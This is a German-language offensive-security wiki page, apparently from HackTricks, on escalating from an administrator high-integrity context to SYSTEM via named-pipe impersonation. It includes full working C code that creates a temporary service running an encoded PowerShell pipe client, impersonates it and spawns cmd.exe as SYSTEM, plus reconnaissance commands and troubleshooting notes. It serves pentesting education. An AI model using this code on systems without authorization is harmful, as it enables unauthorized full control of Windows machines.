# Von hoher Integrität zu SYSTEM mit Named Pipes

{{#include ../../banners/hacktricks-training.md}}

Dies ist die **Administrator/SCM-Variante** der Named-Pipe-Impersonation: Ein privilegierter Prozess erstellt einen temporären Service, dessen Kindprozess sich als `SYSTEM` verbindet und anschließend diesen Client impersoniert. Wenn der Ausgangskontext keine Services erstellen kann, aber über `SeImpersonatePrivilege` verfügt, verwende stattdessen eine privileged-service coercion; siehe [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) und [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Das Erstellen des Services erfordert Zugriff auf den SCM sowie `SERVICE_START`-Zugriff auf den neuen Service, während `CreateProcessWithTokenW` `SeImpersonatePrivilege` erfordert.<sup>[[2]](#references)[[3]](#references)</sup>

Bestätige zunächst schnell den erwarteten Ausgangskontext:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Code-Ablauf:**

1. Erstelle den Named-Pipe-Server **vor** dem Starten des Dienstes. Behandle beim Warten die Rückgabe `FALSE` von `ConnectNamedPipe` zusammen mit `ERROR_PIPE_CONNECTED` als Erfolg: Das bedeutet, dass der Client das Rennen gewonnen und sich zwischen `CreateNamedPipe` und `ConnectNamedPipe` verbunden hat.<sup>[[4]](#references)</sup>
2. Erstelle und starte einen Dienst, der sich mit der erstellten Pipe verbindet und etwas schreibt. Der Dienstcode führt diesen codierten PS-Code aus: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Nachdem der Dienst die Verbindung hergestellt und geschrieben hat, rufe `ImpersonateNamedPipeClient` auf, öffne das resultierende Thread-Token und dupliziere es als primäres Token.<sup>[[1]](#references)</sup>
4. Verwende dieses primäre Token, um `cmd.exe` zu starten.<sup>[[2]](#references)</sup>

Diese Vorgehensweise setzt voraus, dass der Aufrufer einen Dienst erstellen/starten kann und über die für `CreateProcessWithTokenW` erforderlichen Privilegien verfügt (normalerweise `SeImpersonatePrivilege`). Es handelt sich um eine High-Integrity-to-SYSTEM-Technik und nicht um ein Primitiv, das einem beliebigen Benutzer mit niedrigen Privilegien zur Verfügung steht.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Wenn die Erstellung oder der Start des Dienstes fehlschlägt, signalisiert das Beispiel dem Pipe-Thread dies nicht und kann unbegrenzt warten. Füge eine Fehlerbehandlung und ein Timeout für eine overlapped Pipe hinzu, bevor du den Code außerhalb eines Labs verwendest. Verwende außerdem einen zufälligen Pipe-/Dienstnamen, um Kollisionen zu vermeiden.

`ImpersonateNamedPipeClient` übernimmt den Kontext, der mit der **zuletzt gelesenen Nachricht** verknüpft ist. Eine bestehende Verbindung allein reicht daher nicht aus: Veranlasse den privilegierten Client zum Schreiben, überprüfe, dass `ReadFile` Daten zurückgegeben hat, und führe erst danach die Impersonation durch. Dupliziere das Thread-Impersonation-Token mit `SecurityImpersonation` in ein `TokenPrimary`-Token. Ein primäres Token wird von der API zur Prozesserstellung benötigt.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Fehleranalyse

- `ConnectNamedPipe == FALSE` mit `ERROR_PIPE_CONNECTED`: fortfahren; die Pipe ist bereits verbunden.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` schlägt mit `ERROR_CANNOT_IMPERSONATE` (`1368`) fehl: Bestätige, dass der SYSTEM-Client tatsächlich Daten geschrieben hat und `ReadFile` abgeschlossen wurde. Überprüfe außerdem die vom Client angeforderte Impersonationsebene; Clients auf Identification-/Anonymous-Ebene können nicht vollständig impersoniert werden.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` schlägt mit `ERROR_PRIVILEGE_NOT_HELD` (`1314`) fehl: Der ursprüngliche Aufrufer besitzt nicht `SeImpersonatePrivilege`. Verwende aus einem High-Integrity-Administratorkontext den in [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) dokumentierten Token-Copy-Weg oder nutze `CreateProcessAsUserW`, während du SYSTEM impersonierst, sofern die erforderlichen Privilegien vorhanden sind.<sup>[[2]](#references)</sup>
- `CreateServiceA` gibt `ERROR_SERVICE_EXISTS` (`1073`) zurück: Lösche den veralteten `PiperSrv`-Eintrag oder randomisiere `PIPESRV`; lösche den temporären Service immer nach dem Trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
